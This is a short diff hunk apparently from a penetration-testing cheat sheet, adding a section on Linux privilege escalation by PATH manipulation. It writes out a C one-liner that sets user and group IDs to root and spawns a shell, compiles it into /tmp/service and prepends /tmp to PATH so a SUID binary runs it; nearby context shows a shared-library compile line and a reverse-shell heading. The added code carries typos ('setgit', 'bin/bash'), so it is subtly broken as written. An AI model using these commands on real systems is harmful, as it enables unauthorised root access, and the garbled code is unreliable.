@@ -1116,6 +1116,14 @@ Compile with
 
     gcc -shared -fPIC -o /pathToDeployTo /PathOfTheSourceFile
 
+*Escalate with PATH manipulation*
+
+Create an alternative "service" file to execute.
+This will only with in combination with SUID.
+
+    echo 'int main() { setgit(0); setuid(0); system("bin/bash"); return 0;}' > /tmp/service.c
+    gcc /tmp/service.c -o /tmp/service
+    export PATH=/tmp:$PATH
 
 *Reverse Shell one liner*
 
